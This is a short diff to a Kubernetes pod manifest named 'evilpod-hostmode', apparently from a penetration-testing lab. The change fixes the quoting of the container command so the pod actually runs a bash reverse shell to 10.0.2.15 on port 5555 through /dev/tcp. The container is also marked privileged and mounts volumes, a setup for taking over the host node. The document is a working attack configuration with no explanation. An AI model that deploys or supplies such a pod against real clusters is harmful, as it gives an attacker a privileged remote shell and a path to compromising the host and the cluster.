@@ -8,7 +8,7 @@ spec:
   containers:
   - name: "evilpod-hostmode"
     image: "ubuntu"
-    command: '["bash","-c","bash -i >& /dev/tcp/10.0.2.15/5555 0>&1"]'
+    command: ["bash","-c","bash -i >& /dev/tcp/10.0.2.15/5555 0>&1"]
     securityContext:
       privileged: true
     volumeMounts:
